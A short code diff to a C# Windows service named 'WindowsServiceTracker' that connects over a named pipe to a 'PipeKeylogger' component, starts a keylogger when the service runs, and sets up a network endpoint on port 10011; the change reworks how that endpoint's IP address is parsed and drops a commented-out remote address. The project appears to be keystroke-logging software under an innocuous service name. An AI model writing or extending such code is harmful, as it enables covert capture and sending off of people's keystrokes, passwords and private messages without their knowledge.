@@ -27,14 +27,15 @@ namespace WindowsServiceTracker
     {
         //Constants
         //127.0.0.1 = 0x0100007F because of network byte order
-        private const long IP_ADDRESS = 0x0100007F;//0x6c3911ac;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
 
         //Variables
-        private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
+        private String ipAddressString = "127.0.0.1";
+        private long ipAddress = 0x0100007F; //default to local host
+        private IPEndPoint ipPort;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
         private KeyloggerCommInterface pipeProxy;
@@ -77,6 +78,16 @@ namespace WindowsServiceTracker
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
             System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);
+
+            //convert string IP to long
+            try
+            {
+                ipAddress = BitConverter.ToInt32(IPAddress.Parse(ipAddressString).GetAddressBytes(), 0);
+            }
+            catch (Exception)
+            { }
+
+            ipPort = new IPEndPoint(ipAddress, PORT);
 
             CreateOpenPipe();
             StartKeylogger(); //todo remove after debugging
@@ -134,7 +145,7 @@ namespace WindowsServiceTracker
             {
                 return pipeProxy.CheckIfRunning();
             }
-            catch (Exception e)
+            catch (Exception)
             {
                 return false;
             }
